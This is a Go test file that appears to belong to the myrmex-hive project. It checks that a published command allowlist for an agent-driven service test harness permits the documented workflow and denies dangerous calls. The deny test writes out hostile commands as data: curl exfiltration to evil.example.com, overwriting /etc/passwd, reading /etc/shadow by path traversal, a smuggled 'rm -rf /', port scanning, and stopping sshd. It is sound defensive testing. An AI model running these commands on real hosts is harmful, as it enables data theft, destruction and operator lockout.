package command_test

// Guards the shipped service-test-harness allowlist profile
// (examples/service-test-harness/agent_config.harness.json, documented in
// docs/SERVICE_TESTING.md) by driving it through the REAL validator.
//
// The profile is a hand-maintained security boundary that we publish and
// invite operators to copy. An over-permissive regex in it is a vulnerability
// with our name on it, so the patterns are proven here rather than eyeballed.

import (
	"encoding/json"
	"os"
	"os/exec"
	"strings"
	"testing"
	"time"

	"github.com/olafkfreund/myrmex-hive/pkg/command"
	"github.com/olafkfreund/myrmex-hive/pkg/config"
)

const harnessProfilePath = "../../examples/service-test-harness/agent_config.harness.json"

// allowlistVerdict reports whether the ALLOWLIST accepted a call, independent
// of whether the binary happens to be installed on this machine.
//
// validateCommand checks name+regex first and only then resolves the binary on
// PATH, so a missing `dig` must not read as "the regex rejected it" — that
// would make this test pass or fail on the runner's package list.
func allowlistVerdict(t *testing.T, name, args string, allow []config.AllowedCommand) bool {
	t.Helper()
	_, err := command.DryRun(name, splitArgs(args), allow)
	if err == nil {
		return true
	}
	if strings.Contains(err.Error(), "failed to resolve command") {
		return true // passed the allowlist; simply not installed here
	}
	return false
}

func loadHarnessProfile(t *testing.T) []config.AllowedCommand {
	t.Helper()
	raw, err := os.ReadFile(harnessProfilePath)
	if err != nil {
		t.Fatalf("shipped harness profile is missing: %v", err)
	}
	var cfg config.AgentConfig
	if err := json.Unmarshal(raw, &cfg); err != nil {
		t.Fatalf("shipped harness profile does not load as an AgentConfig: %v", err)
	}
	if len(cfg.AllowedCommands) == 0 {
		t.Fatal("shipped harness profile parsed to zero allowed commands")
	}
	return cfg.AllowedCommands
}

// A duplicate name is dead config: validateCommand takes the FIRST entry whose
// name matches and stops, so a second `curl` entry would never be consulted.
func TestHarnessProfileHasNoDuplicateCommandNames(t *testing.T) {
	seen := map[string]bool{}
	for _, c := range loadHarnessProfile(t) {
		if seen[c.Name] {
			t.Errorf("duplicate allowlist entry for %q — the second is unreachable; merge it into the first as a regex alternation", c.Name)
		}
		seen[c.Name] = true
	}
}

func TestHarnessProfileAllowsTheDocumentedWorkflow(t *testing.T) {
	allow := loadHarnessProfile(t)
	for _, c := range []struct{ name, args string }{
		{"/opt/myrmex/chaos.sh", "cpu 30 4"},
		{"/opt/myrmex/chaos.sh", "mem 60 512"},
		{"/opt/myrmex/chaos.sh", "latency 30 250 eth0"},
		{"/opt/myrmex/chaos.sh", "loss 15 10 ens5"},
		{"/opt/myrmex/chaos.sh", "kill TERM /run/myservice.pid"},
		{"/opt/myrmex/chaos.sh", "status"},
		{"curl", "-s -o /dev/null -w %{http_code}:%{time_total} --max-time 5 http://localhost:8080/healthz"},
		{"curl", "-s --max-time 5 http://myservice.internal/api/v1/status"},
		{"wget", "-q -O - -T 5 http://127.0.0.1:8080/healthz"},
		{"nc", "-z -w 2 db.internal 5432"},
		{"dig", "+short db.internal"},
		// Recovery. Bare (no args) must be permitted: that is the START path,
		// and without it the harness can kill a service it cannot bring back.
		{"/usr/sbin/myservice", ""},
		{"/usr/sbin/myservice", "-s reload"},
		{"/opt/myrmex/apply-config.sh", "high-timeout"},
		{"systemctl", "restart myservice"},
		{"journalctl", "-u myservice -n 200 --no-pager"},
		{"ss", "-tlnp"},
	} {
		if !allowlistVerdict(t, c.name, c.args, allow) {
			t.Errorf("documented workflow step was REFUSED: %s %s", c.name, c.args)
		}
	}
}

// The calls the profile exists to refuse. Each is a plausible mistake or a
// real attack against a host running the harness.
func TestHarnessProfileDeniesTheDangerousCalls(t *testing.T) {
	allow := loadHarnessProfile(t)
	for _, c := range []struct{ why, name, args string }{
		{"chaos verb outside the fixed set", "/opt/myrmex/chaos.sh", "reboot 10 1"},
		{"duration beyond the cap", "/opt/myrmex/chaos.sh", "cpu 9999 4"},
		{"signal outside the permitted set", "/opt/myrmex/chaos.sh", "kill INT /run/myservice.pid"},
		{"killing a process that is not the target", "/opt/myrmex/chaos.sh", "kill TERM /run/sshd.pid"},
		{"exfiltration to an unpinned host", "curl", "-s --max-time 5 http://evil.example.com/steal"},
		{"unpinned host over https", "curl", "-s --max-time 5 https://evil.example.com/"},
		{"curl overwriting a system file", "curl", "-s -o /etc/passwd --max-time 5 http://localhost:8080/x"},
		{"port-scanning a third party", "nc", "-z -w 2 10.0.0.5 22"},
		{"restarting a service that is not under test", "systemctl", "restart sshd"},
		{"stopping sshd — locking the operator out", "systemctl", "stop sshd"},
		{"path traversal as a config variant", "/opt/myrmex/apply-config.sh", "../../etc/shadow"},
		{"shell metacharacter smuggling", "/opt/myrmex/chaos.sh", "status; rm -rf /"},
		{"trailing-argument padding (the #151 substring class)", "systemctl", "restart myservice extra"},
		{"a command that is not on the list at all", "bash", "-c whoami"},
		{"recovery entry must not become a general runner", "/usr/sbin/myservice", "-c /etc/evil.conf"},
		{"probe pinned away from arbitrary hosts", "wget", "-q -O - -T 5 http://evil.example.com/"},
	} {
		if allowlistVerdict(t, c.name, c.args, allow) {
			t.Errorf("SHOULD BE DENIED (%s) but the allowlist approved: %s %s", c.why, c.name, c.args)
		}
	}
}

// Timed chaos actions MUST return immediately rather than blocking for their
// duration.
//
// ExecuteCommand kills at 30s using exec.CommandContext, which sends SIGKILL,
// and SIGKILL runs no EXIT traps. A blocking `latency 60 ...` would therefore
// be killed mid-sleep with its netem rule still installed — permanently. The
// script avoids that by detaching both the fault and its teardown, and this
// test fails if anyone reintroduces the blocking form.
func TestChaosScriptDoesNotBlockForItsDuration(t *testing.T) {
	script := "../../examples/service-test-harness/chaos.sh"
	if _, err := os.Stat(script); err != nil {
		t.Skipf("chaos.sh not present: %v", err)
	}
	if _, err := exec.LookPath("bash"); err != nil {
		t.Skip("bash not available")
	}

	// A duration far beyond the assertion window, so a blocking implementation
	// cannot pass by being quick.
	start := time.Now()
	out, err := exec.Command("bash", script, "cpu", "20", "1").CombinedOutput()
	elapsed := time.Since(start)

	if err != nil {
		t.Fatalf("chaos.sh cpu 20 1 failed: %v\n%s", err, out)
	}
	if elapsed > 5*time.Second {
		t.Errorf("chaos.sh blocked for %v — a timed action must detach and return immediately, "+
			"or the agent's 30s SIGKILL will strand the fault with its teardown never run", elapsed)
	}
}

// splitArgs mirrors how the agent hands argv to the validator: already split,
// no shell involved.
func splitArgs(s string) []string {
	if s == "" {
		return nil
	}
	return strings.Split(s, " ")
}
